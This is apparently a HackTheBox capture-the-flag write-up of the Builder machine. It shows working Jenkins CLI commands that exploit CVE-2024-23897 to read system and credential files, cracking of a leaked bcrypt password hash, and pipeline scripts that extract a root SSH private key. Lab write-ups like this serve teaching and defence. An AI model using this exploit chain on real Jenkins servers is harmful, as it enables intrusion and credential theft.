HTB: Builder
============

![Builder](https://0xdf.gitlab.io/img/builder-cover.png)

Builder is a neat box focused on a recent Jenkins vulnerability, CVE-2024-23897. It allows for partial file read and can lead to remote code execution. I’ll show how to exploit the vulnerability, explore methods to get the most of a file possible, find a password hash for the admin user and crack it to get access to Jenkins. From in Jenkins, I’ll find a saved SSH key and show three paths to recover it. First, dumping an encrypted version from the admin panel. Second, using it to SSH into the host and finding a copy there. And third by having the pipeline leak the key back to me.

## Box Info

Name[Builder](https://www.hackthebox.com/machines/builder) [![Builder](https://0xdf.gitlab.io/icons/box-builder.png)](https://www.hackthebox.com/machines/builder)

[Play on HackTheBox](https://www.hackthebox.com/machines/builder)Release Date12 Feb 2024Retire Date12 Feb 2024OSLinux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)Base PointsMedium \[30\]![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)N/A (non-competitive)![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)N/A (non-competitive)Creators[![polarbearer](https://www.hackthebox.eu/badge/image/159204)](https://app.hackthebox.com/users/159204)

[![amra13579](https://www.hackthebox.eu/badge/image/123322)](https://app.hackthebox.com/users/123322)

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (8080):

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.10
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-09 12:55 EST
Nmap scan report for 10.10.11.10
Host is up (0.094s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds
oxdf@hacky$ nmap -p 22,8080 -sCV 10.10.11.10
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-09 12:55 EST
Nmap scan report for 10.10.11.10
Host is up (0.093s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Jetty 10.0.18
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(10.0.18)
|_http-title: Dashboard [Jenkins]
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.35 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 22.04 jammy.

There’s a `robots.txt` file on the webserver on port 8080 disallowing bots to scan any of the site. And the title seems to be a Jenkins server. I’ve seen Jenkins before on HTB. [Jeeves](https://0xdf.gitlab.io/2022/04/14/htb-jeeves.html) released in 2017, and [Object](https://0xdf.gitlab.io/2022/02/28/htb-object.html) was a part of the 2021 HackTheBox Uni CTF. I played with an RCE vulnerability in Jenkins (CVE-2019-1003000) on Jeeves in [this 2019 blog post](https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html).

### Website - TCP 8080

#### Site

The site is a Jenkins instance:

![image-20240209132202670](https://0xdf.gitlab.io/img/image-20240209132202670.png)

The people tab shows one user, jennifer:

![image-20240209132627823](https://0xdf.gitlab.io/img/image-20240209132627823.png)

The build history is empty. The “Credentials” page shows some basic info:

![image-20240209132705558](https://0xdf.gitlab.io/img/image-20240209132705558.png)

There’s a single credential that is a root SSH private key:

![image-20240211170650475](https://0xdf.gitlab.io/img/image-20240211170650475.png)

I can’t get access to it.

#### Tech Stack

The site is clearly Jenkins, which describes itself as:

> The leading open source automation server, Jenkins provides hundreds of plugins to support building, deploying and automating any project.

As soon as I visit the page, the first request provides a `JSESSIONID` cookie:

```
HTTP/1.1 200 OK
Date: Fri, 09 Feb 2024 18:21:41 GMT
Connection: close
X-Content-Type-Options: nosniff
Content-Type: text/html;charset=utf-8
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Cache-Control: no-cache,no-store,must-revalidate
X-Hudson-Theme: default
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
Set-Cookie: JSESSIONID.680b9dc7=node0593121crjqec957avgei7j7h36.node0; Path=/; HttpOnly
X-Hudson: 1.395
X-Jenkins: 2.441
X-Jenkins-Session: 12cf4fc7
X-Frame-Options: sameorigin
X-Instance-Identity: MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuoLwaR1Kews72rSEsEkyDUFAKfX2Wk1mS06hi9A56Bx34LBdMQK3n6yCy0nJaT/KJcSx5hXA6DA1yNKWevPUO9nmgDZWaKxDhW/3uLvFtW68YnadxFiP7HLnRNulCWkaHgVIW/71MPrR9jOfjQ/BLPjBCBkLAdBsrCVrZ0/A/yj6H8YBGQIDk8hRjsqtMM0EBPzH/TylyC7DmHWtIkZqvLH7PKTycZ54Lcv9i9NVd/cLBZjEyzUua6n28OVsZif9yQ41qPmzwRlhZ7DAKi1wI48T+FatD9gz8v6KtjkftDht3CyT+GLYwUPy7z501y/RoOzldBpY2tgxvNTpIQgoDwIDAQAB
Content-Length: 14972
Server: Jetty(10.0.18)

```

That makes sense, as Jenkins is a Java application. The server is Jetty, a Java web server.

I’m going to skip the directory brute force given that I know exactly what this application is.

## Authenticate Jenkins Access

### CVE-2024-23897 Background

CVE-2024-23897 is the reason this box was released by HTB as a non-competitive box to showcase this hot vulnerability. It was first discussed mid-January 2024, with Jenkins making a Security Advisory on 24 January [here](https://www.jenkins.io/security/advisory/2024-01-24/). The title is “Arbitrary file read vulnerability through the CLI can lead to RCE.

Jenkins has a CLI interface to control it from a scripted / automation / shell environment. In that, a feature was added where a `@[filepath]` would be replaced with the contents of the file. This leads to a file read.

The advisory shows five ways this can be leverages into remote coded execution, as well as some other abuses.

### File Read

#### Manual w/ jenkin-cli.jar

The [Jenkins CLI documentation](https://www.jenkins.io/doc/book/managing/cli/#downloading-the-client) shows that you actually get the CLI JAR from the Jenkins instance. I’ll download it:

```
oxdf@hacky$ wget http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar
--2024-02-09 14:18:41--  http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar
Connecting to 10.10.11.10:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3623400 (3.5M) [application/java-archive]
Saving to: ‘jenkins-cli.jar’

jenkins-cli.jar                                 100%[====================>]   3.46M  3.34MB/s    in 1.0s

2024-02-09 14:18:42 (3.34 MB/s) - ‘jenkins-cli.jar’ saved [3623400/3623400]

```

On running it, I’ll give it `help` and then a non-existent command, and it prints all the commands:

```
oxdf@hacky$ java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' help 0xdf
  add-job-to-view
    Adds jobs to view.
  build
    Builds a job, and optionally waits until its completion.
  cancel-quiet-down
    Cancel the effect of the "quiet-down" command.
  clear-queue
    Clears the build queue.
  connect-node
    Reconnect to a node(s)
  console
    Retrieves console output of a build.
  copy-job
    Copies a job.
  create-credentials-by-xml
    Create Credential by XML
  create-credentials-domain-by-xml
    Create Credentials Domain by XML
  create-job
    Creates a new job by reading stdin as a configuration XML file.
  create-node
    Creates a new node by reading stdin as a XML configuration.
  create-view
    Creates a new view by reading stdin as a XML configuration.
  declarative-linter
    Validate a Jenkinsfile containing a Declarative Pipeline
  delete-builds
    Deletes build record(s).
  delete-credentials
    Delete a Credential
  delete-credentials-domain
    Delete a Credentials Domain
  delete-job
    Deletes job(s).
  delete-node
    Deletes node(s)
  delete-view
    Deletes view(s).
  disable-job
    Disables a job.
  disable-plugin
    Disable one or more installed plugins.
  disconnect-node
    Disconnects from a node.
  enable-job
    Enables a job.
  enable-plugin
    Enables one or more installed plugins transitively.
  get-credentials-as-xml
    Get a Credentials as XML (secrets redacted)
  get-credentials-domain-as-xml
    Get a Credentials Domain as XML
  get-job
    Dumps the job definition XML to stdout.
  get-node
    Dumps the node definition XML to stdout.
  get-view
    Dumps the view definition XML to stdout.
  groovy
    Executes the specified Groovy script.
  groovysh
    Runs an interactive groovy shell.
  help
    Lists all the available commands or a detailed description of single command.
  import-credentials-as-xml
    Import credentials as XML. The output of "list-credentials-as-xml" can be used as input here as is, the only needed change is to set the actual Secrets which are redacted in the output.
  install-plugin
    Installs a plugin either from a file, an URL, or from update center.
  keep-build
    Mark the build to keep the build forever.
  list-changes
    Dumps the changelog for the specified build(s).
  list-credentials
    Lists the Credentials in a specific Store
  list-credentials-as-xml
    Export credentials as XML. The output of this command can be used as input for "import-credentials-as-xml" as is, the only needed change is to set the actual Secrets which are redacted in the output.
  list-credentials-context-resolvers
    List Credentials Context Resolvers
  list-credentials-providers
    List Credentials Providers
  list-jobs
    Lists all jobs in a specific view or item group.
  list-plugins
    Outputs a list of installed plugins.
  mail
    Reads stdin and sends that out as an e-mail.
  offline-node
    Stop using a node for performing builds temporarily, until the next "online-node" command.
  online-node
    Resume using a node for performing builds, to cancel out the earlier "offline-node" command.
  quiet-down
    Quiet down Jenkins, in preparation for a restart. Don’t start any builds.
  reload-configuration
    Discard all the loaded data in memory and reload everything from file system. Useful when you modified config files directly on disk.
  reload-job
    Reload job(s)
  remove-job-from-view
    Removes jobs from view.
  replay-pipeline
    Replay a Pipeline build with edited script taken from standard input
  restart
    Restart Jenkins.
  restart-from-stage
    Restart a completed Declarative Pipeline build from a given stage.
  safe-restart
    Safe Restart Jenkins. Don’t start any builds.
  safe-shutdown
    Puts Jenkins into the quiet mode, wait for existing builds to be completed, and then shut down Jenkins.
  session-id
    Outputs the session ID, which changes every time Jenkins restarts.
  set-build-description
    Sets the description of a build.
  set-build-display-name
    Sets the displayName of a build.
  shutdown
    Immediately shuts down Jenkins server.
  stop-builds
    Stop all running builds for job(s)
  update-credentials-by-xml
    Update Credentials by XML
  update-credentials-domain-by-xml
    Update Credentials Domain by XML
  update-job
    Updates the job definition XML from stdin. The opposite of the get-job command.
  update-node
    Updates the node definition XML from stdin. The opposite of the get-node command.
  update-view
    Updates the view definition XML from stdin. The opposite of the get-view command.
  version
    Outputs the current version.
  wait-node-offline
    Wait for a node to become offline.
  wait-node-online
    Wait for a node to become online.
  who-am-i
    Reports your credential and permissions.

ERROR: No such command 0xdf. Available commands are above.

```

Those command run as well:

```
oxdf@hacky$ java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' who-am-i
Authenticated as: anonymous
Authorities:
  anonymous

```

From the advisory, I can try putting in a file reference:

![image-20240209171545905](https://0xdf.gitlab.io/img/image-20240209171545905.png)

It’s trying to load `/etc/passwd` as arguments for the help command. The first line is the command ( `root`), and the next is an unexpected argument. That’s partial file read for sure. For one line files, this is enough (adding an extra arg, in this case “a”, makes the output much shorter):

```
oxdf@hacky$ java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' help '@/etc/hostname' a

ERROR: Too many arguments: a
java -jar jenkins-cli.jar help [COMMAND]
Lists all the available commands or a detailed description of single command.
 COMMAND : Name of the command (default: 0f52c222a4cc)

```

The hostname is “0f52c222a4cc”.

#### Python POCs

There are Python POCs out there on GitHub that will do a similar thing. They don’t really add anything over the JAR file, so I prefer that method. They do work to make similar output:

```
oxdf@hacky$ python CVE-2024-23897/poc.py  http://10.10.11.10:8080/ /etc/passwd
REQ: b'\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e\x00\x00\x0c@/etc/passwd\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05zh_CN\x00\x00\x00\x00\x03'

RESPONSE: b'\x00\x00\x00\x00\x01\x08\n\x00\x00\x00K\x08ERROR: Too many arguments: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n\x00\x00\x00\x1e\x08java -jar jenkins-cli.jar help\x00\x00\x00\n\x08 [COMMAND]\x00\x00\x00\x01\x08\n\x00\x00\x00N\x08Lists all the available commands or a detailed description of single command.\n\x00\x00\x00J\x08 COMMAND : Name of the command (default: root:x:0:0:root:/root:/bin/bash)\n\x00\x00\x00\x04\x04\x00\x00\x00\x02'

```

#### Getting More Lines

In [this video](https://www.youtube.com/watch?v=toPJhfy-wvw), I explore the vulnerability, walk through exploitation with both the JAR and the Python POC, and show the path to finding a method to leak more lines:

By the end of the video, I’ve got this output:

```
oxdf@hacky$ cat commands | while read command; do echo "echo -n \"$command: \"; java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' $command '@/etc/passwd' 2>&1 | grep -oP ':\d+:\d+:' | sort -u | wc -l"; done > ipp.sh
oxdf@hacky$ bash ipp.sh
add-job-to-view: 1
build: 1
cancel-quiet-down: 1
clear-queue: 1
connect-node: 19
console: 1
copy-job: 1
create-credentials-by-xml: 1
create-credentials-domain-by-xml: 1
create-job: 1
create-node: 2
create-view: 2
declarative-linter: 1
delete-builds: 1
delete-credentials: 1
delete-credentials-domain: 1
delete-job: 19
delete-node: 19
delete-view: 19
disable-job: 1
disable-plugin: 0
disconnect-node: 19
enable-job: 1
enable-plugin: 0
get-credentials-as-xml: 1
get-credentials-domain-as-xml: 1
get-job: 1
get-node: 1
get-view: 1
groovy: 0
groovysh: 0
help: 2
import-credentials-as-xml: 1
install-plugin: 0
keep-build: 1
list-changes: 1
list-credentials: 1
list-credentials-as-xml: 1
list-credentials-context-resolvers: 1
list-credentials-providers: 1
list-jobs: 2
list-plugins: 2
mail: 1
offline-node: 19
online-node: 19
quiet-down: 1
reload-configuration: 1
reload-job: 19
remove-job-from-view: 1
replay-pipeline: 1
restart: 1
restart-from-stage: 1
safe-restart: 1
safe-shutdown: 1
session-id: 1
set-build-description: 1
set-build-display-name: 1
shutdown: 1
stop-builds: 1
update-credentials-by-xml: 1
update-credentials-domain-by-xml: 1
update-job: 1
update-node: 1
update-view: 1
version: 1
wait-node-offline: 1
wait-node-online: 1
who-am-i: 1

```

All of the “19” results seem equally good.

### Enumeration

#### Home Directory

I’ll look at the running command to get a feel for what the environment looks like for Jenkins. The command line ( `/proc/self/cmdline`, cleaned up with spaces added) is:

```
java -Duser.home=/var/jenkins_home -Djenkins.model.Jenkins.slaveAgentPort=50000 -Dhudson.lifecycle=hudson.lifecycle.ExitLifecycle -jar /usr/share/jenkins/jenkins.war

```

The environment variables ( `/proc/self/environ`) are:

```
HOSTNAME=0f52c222a4cc
JENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimental
JAVA_HOME=/opt/java/openjdk
JENKINS_INCREMENTALS_REPO_MIRROR=https://repo.jenkins-ci.org/incrementals
COPY_REFERENCE_FILE_LOG=/var/jenkins_home/copy_reference_file.log
PWD=/
JENKINS_SLAVE_AGENT_PORT=50000
JENKINS_VERSION=2.441
HOME=/var/jenkins_home
LANG=C.UTF-8
JENKINS_UC=https://updates.jenkins.io
SHLVL=0
JENKINS_HOME=/var/jenkins_home
REF=/usr/share/jenkins/ref
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

```

I can actually read `user.txt` at this point from the jenkins user’s home directory:

```
oxdf@hacky$ java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' help '@/var/jenkins_home/user.txt' a

ERROR: Too many arguments: a
java -jar jenkins-cli.jar help [COMMAND]
Lists all the available commands or a detailed description of single command.
 COMMAND : Name of the command (default: ffcb78dc3a26226b97276f24e26fc272)

```

#### Passwords

Jenkins [stores](https://boozallen.github.io/sdp-docs/learning-labs/1/local-development/3-configure-jenkins.html) the initial password for the admin user at `/var/jenkins_home/secrets/initialAdminPassword`. Unfortunately, that returns “No such file”:

```
oxdf@hacky$ java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' help '@/var/jenkins_home/secrets/initialAdminPassword' a

ERROR: No such file: /var/jenkins_home/secrets/initialAdminPassword
java -jar jenkins-cli.jar help [COMMAND]
Lists all the available commands or a detailed description of single command.
 COMMAND : Name of the command

```

Jenkins [stores information](https://dev.to/pencillr/spawn-a-jenkins-from-code-gfa) about its user accounts in `/var/jenkins_home/users/users.xml`. Using `reload-node`, I’ll get the lines of that file, albeit a bit scrambed:

```
oxdf@hacky$ java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' reload-job '@/var/jenkins_home/users/users.xml'
<?xml version='1.1' encoding='UTF-8'?>: No such item ‘<?xml version='1.1' encoding='UTF-8'?>’ exists.
      <string>jennifer_12108429903186576833</string>: No such item ‘      <string>jennifer_12108429903186576833</string>’ exists.
  <idToDirectoryNameMap class="concurrent-hash-map">: No such item ‘  <idToDirectoryNameMap class="concurrent-hash-map">’ exists.
    <entry>: No such item ‘    <entry>’ exists.
      <string>jennifer</string>: No such item ‘      <string>jennifer</string>’ exists.
  <version>1</version>: No such item ‘  <version>1</version>’ exists.
</hudson.model.UserIdMapper>: No such item ‘</hudson.model.UserIdMapper>’ exists.
  </idToDirectoryNameMap>: No such item ‘  </idToDirectoryNameMap>’ exists.
<hudson.model.UserIdMapper>: No such item ‘<hudson.model.UserIdMapper>’ exists.
    </entry>: No such item ‘    </entry>’ exists.

ERROR: Error occurred while performing this command, see previous stderr output.

```

Still, I can see a user “jennifer\_12108429903186576833”, which matches the jennifer user on the site [above](#site). That is a directory name and in it will be a `config.xml`:

```
oxdf@hacky$ java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' reload-job '@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml'
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@463.vedf8358e006b_">: No such item ‘    <hudson.tasks.Mailer_-UserProperty plugin="mailer@463.vedf8358e006b_">’ exists.
    <hudson.search.UserSearchProperty>: No such item ‘    <hudson.search.UserSearchProperty>’ exists.
      <roles>: No such item ‘      <roles>’ exists.
    <jenkins.security.seed.UserSeedProperty>: No such item ‘    <jenkins.security.seed.UserSeedProperty>’ exists.
      </tokenStore>: No such item ‘      </tokenStore>’ exists.
    </hudson.search.UserSearchProperty>: No such item ‘    </hudson.search.UserSearchProperty>’ exists.
      <timeZoneName></timeZoneName>: No such item ‘      <timeZoneName></timeZoneName>’ exists.
  <properties>: No such item ‘  <properties>’ exists.
    <jenkins.security.LastGrantedAuthoritiesProperty>: No such item ‘    <jenkins.security.LastGrantedAuthoritiesProperty>’ exists.
      <flags/>: No such item ‘      <flags/>’ exists.
    <hudson.model.MyViewsProperty>: No such item ‘    <hudson.model.MyViewsProperty>’ exists.
</user>: No such item ‘</user>’ exists.
    </jenkins.security.ApiTokenProperty>: No such item ‘    </jenkins.security.ApiTokenProperty>’ exists.
      <views>: No such item ‘      <views>’ exists.
        <string>authenticated</string>: No such item ‘        <string>authenticated</string>’ exists.
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.200.vb_9327d658781">: No such item ‘    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.200.vb_9327d658781">’ exists.
<user>: No such item ‘<user>’ exists.
          <name>all</name>: No such item ‘          <name>all</name>’ exists.
  <description></description>: No such item ‘  <description></description>’ exists.
      <emailAddress>jennifer@builder.htb</emailAddress>: No such item ‘      <emailAddress>jennifer@builder.htb</emailAddress>’ exists.
      <collapsed/>: No such item ‘      <collapsed/>’ exists.
    </jenkins.security.seed.UserSeedProperty>: No such item ‘    </jenkins.security.seed.UserSeedProperty>’ exists.
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>: No such item ‘    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>’ exists.
    </hudson.model.MyViewsProperty>: No such item ‘    </hudson.model.MyViewsProperty>’ exists.
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"/>: No such item ‘      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"/>’ exists.
          <filterQueue>false</filterQueue>: No such item ‘          <filterQueue>false</filterQueue>’ exists.
    <jenkins.security.ApiTokenProperty>: No such item ‘    <jenkins.security.ApiTokenProperty>’ exists.
      <primaryViewName></primaryViewName>: No such item ‘      <primaryViewName></primaryViewName>’ exists.
      </views>: No such item ‘      </views>’ exists.
    </hudson.model.TimeZoneProperty>: No such item ‘    </hudson.model.TimeZoneProperty>’ exists.
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@1319.v7eb_51b_3a_c97b_">: No such item ‘    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@1319.v7eb_51b_3a_c97b_">’ exists.
    </hudson.model.PaneStatusProperties>: No such item ‘    </hudson.model.PaneStatusProperties>’ exists.
    </hudson.tasks.Mailer_-UserProperty>: No such item ‘    </hudson.tasks.Mailer_-UserProperty>’ exists.
        <tokenList/>: No such item ‘        <tokenList/>’ exists.
    <jenkins.console.ConsoleUrlProviderUserProperty/>: No such item ‘    <jenkins.console.ConsoleUrlProviderUserProperty/>’ exists.
        </hudson.model.AllView>: No such item ‘        </hudson.model.AllView>’ exists.
      <timestamp>1707318554385</timestamp>: No such item ‘      <timestamp>1707318554385</timestamp>’ exists.
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>: No such item ‘          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>’ exists.
  </properties>: No such item ‘  </properties>’ exists.
    </jenkins.model.experimentalflags.UserExperimentalFlagsProperty>: No such item ‘    </jenkins.model.experimentalflags.UserExperimentalFlagsProperty>’ exists.
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>: No such item ‘    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>’ exists.
    <hudson.security.HudsonPrivateSecurityRealm_-Details>: No such item ‘    <hudson.security.HudsonPrivateSecurityRealm_-Details>’ exists.
      <insensitiveSearch>true</insensitiveSearch>: No such item ‘      <insensitiveSearch>true</insensitiveSearch>’ exists.
          <properties class="hudson.model.View$PropertyList"/>: No such item ‘          <properties class="hudson.model.View$PropertyList"/>’ exists.
    <hudson.model.TimeZoneProperty>: No such item ‘    <hudson.model.TimeZoneProperty>’ exists.
        <hudson.model.AllView>: No such item ‘        <hudson.model.AllView>’ exists.
    </hudson.security.HudsonPrivateSecurityRealm_-Details>: No such item ‘    </hudson.security.HudsonPrivateSecurityRealm_-Details>’ exists.
      <providerId>default</providerId>: No such item ‘      <providerId>default</providerId>’ exists.
      </roles>: No such item ‘      </roles>’ exists.
    </jenkins.security.LastGrantedAuthoritiesProperty>: No such item ‘    </jenkins.security.LastGrantedAuthoritiesProperty>’ exists.
    <jenkins.model.experimentalflags.UserExperimentalFlagsProperty>: No such item ‘    <jenkins.model.experimentalflags.UserExperimentalFlagsProperty>’ exists.
    <hudson.model.PaneStatusProperties>: No such item ‘    <hudson.model.PaneStatusProperties>’ exists.
<?xml version='1.1' encoding='UTF-8'?>: No such item ‘<?xml version='1.1' encoding='UTF-8'?>’ exists.
  <fullName>jennifer</fullName>: No such item ‘  <fullName>jennifer</fullName>’ exists.
      <seed>6841d11dc1de101d</seed>: No such item ‘      <seed>6841d11dc1de101d</seed>’ exists.
  <id>jennifer</id>: No such item ‘  <id>jennifer</id>’ exists.
  <version>10</version>: No such item ‘  <version>10</version>’ exists.
      <tokenStore>: No such item ‘      <tokenStore>’ exists.
          <filterExecutors>false</filterExecutors>: No such item ‘          <filterExecutors>false</filterExecutors>’ exists.
    <io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>: No such item ‘    <io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>’ exists.
      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>: No such item ‘      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>’ exists.

ERROR: Error occurred while performing this command, see previous stderr output.

```

It’s scrambled, but the last line is:

```
<passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>

```

### Crack Hash

The hash matches multiple Bcrypt formats. Trying to give it to `hashcat` returns that I need to give it a format:

```
$ hashcat jennifer_hash test --user
hashcat (v6.2.6) starting in autodetect mode
...[-snip]...
The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce

Please specify the hash-mode with -m [hash-mode].

```

I’m giving it `--user` which treats “#jbcrypt” as the username.

The basic bcrypt format works and cracks very quickly:

```
$ hashcat -m 3200 jennifer_hash --user /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
...[snip]...
$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess
...[snip]...

```

I get the password “princess”, and this works to log into Jenkins as jennifer.

## Shell as root

### Enumeration

Even logged in, I still can’t directly access to the private key for root. There is an update option now:

![image-20240211170836916](https://0xdf.gitlab.io/img/image-20240211170836916.png)

Going into it, there’s a place there the key would be, but it is “Concealed for Confidentiality”:

![image-20240211170930685](https://0xdf.gitlab.io/img/image-20240211170930685.png)

This is likely used by pipelines to SSH into the host system as root and deploy things.

Interestingly, it is there in a hidden form field (encrypted):

![image-20240211171034984](https://0xdf.gitlab.io/img/image-20240211171034984.png)

Under “Plugins” in “Manage Jenkins”, there’s are a few. One of interest is the SSH Agent Plugin and SSH Build Agents Plugin:

![image-20240211171806173](https://0xdf.gitlab.io/img/image-20240211171806173.png)

### Recover SSH Key

#### Overview

I’ll show two ways to take this access to Jenkins as root to Root access on Builder. Both of them abuse the setup that has saved an SSH key into Jenkins. This is commonly done so that once the build process is complete, it can put artifacts (like a website) into place on the desired server.

```
flowchart TD;
    A[root access\nto Jenkins]-->B(Decrypt SSH Key\nfrom Jenkins Admin);
    A-->C(SSH Agent);
    B-->D(root SSH access);
    C-->E(Read SSH key\nfrom Host);
    E-->D;
    A-->F(Dump credential\nin pipeline);
    F-->D;

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;

```

#### Via Decrypt Key

I’m able to grab the base64 data from the hidden field and decrypt it very easily using the script console (from the main dashboard, go to “Manage Jenkins” -> Script Console):

![image-20240211171424021](https://0xdf.gitlab.io/img/image-20240211171424021.png)

#### Via Pipeline SSH

On the main page, I’ll create a new job:

![image-20240211173108845](https://0xdf.gitlab.io/img/image-20240211173108845.png)

On the next page, I’ll give it a name and select Pipeline:

![image-20240211173143227](https://0xdf.gitlab.io/img/image-20240211173143227.png)

On the next screen, I’ll define the pipeline. I can leave most of it as is, and just fill in the “Pipeline script”. The “try sample pipeline” button will offer a starting format.

```
pipeline {
    agent any

    stages {
        stage('Hello') {
            steps {
                echo 'Hello World'
            }
        }
    }
}

```

If I save this and go back to the job page and click “Build Now”, the job runs. In the “Console Output” of the result, it shows the print:

![image-20240212082438786](https://0xdf.gitlab.io/img/image-20240212082438786.png)

[These docs](https://www.jenkins.io/doc/pipeline/steps/ssh-agent/) show how to use the SSH Agent plugin. I’ll paste in their POC as the pipeline:

```
node {
  sshagent (credentials: ['deploy-dev']) {
    sh 'ssh -o StrictHostKeyChecking=no -l cloudbees 192.168.1.106 uname -a'
  }
}

```

I clearly need to change the IP. I’ll also need to change the “credential”. The docs show that it takes a list of strings. Trying with “root” fails:

![image-20240212083225472](https://0xdf.gitlab.io/img/image-20240212083225472.png)

Looking at the credential, it seems the ID is actually just “1”:

![image-20240212083132172](https://0xdf.gitlab.io/img/image-20240212083132172.png)

I’ll update to that:

![image-20240212083307777](https://0xdf.gitlab.io/img/image-20240212083307777.png)

And it works:

![image-20240212083351797](https://0xdf.gitlab.io/img/image-20240212083351797.png)

I’ve successfully run commands on the host.

I’ll update the command from `uname -a` to `find /root`. In this build, it returns a full read of all the files in `/root`:

![image-20240212083527889](https://0xdf.gitlab.io/img/image-20240212083527889.png)

I could read `root.txt`, but I’ll grab that SSH private key instead, changing the command to `cat /root/.ssh/id_rsa`:

![image-20240212083638024](https://0xdf.gitlab.io/img/image-20240212083638024.png)

It’s the same key as the previous method.

#### Via Pipeline Dump Credentials

If the pipeline can use the SSH key to get on to the host system as root, then it has access to the SSH key itself (I’ve already shown it can decrypt it). [This post](https://www.codurance.com/publications/2019/05/30/accessing-and-dumping-jenkins-credentials) talks about dumping credentials. There’s a good bit in the post about how to get it to print the credential unmasked. With a bunch of attempts and troubleshooting, I end up with:

![image-20240212120330195](https://0xdf.gitlab.io/img/image-20240212120330195.png)

When I run that, it prints the SSH key.

![image-20240212120641429](https://0xdf.gitlab.io/img/image-20240212120641429.png)

### SSH

Regardless of how I get it, with the recovered key (and permissions set to 600), I can SSH as root into Builder:

```
oxdf@hacky$ vim ~/keys/builder-root
oxdf@hacky$ chmod 600 ~/keys/builder-root
oxdf@hacky$ ssh -i ~/keys/builder-root root@10.10.11.10
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-94-generic x86_64)
...[snip]...
root@builder:~#

```

And get `root.txt`:

```
root@builder:~# cat root.txt
a0957a94************************

```

###





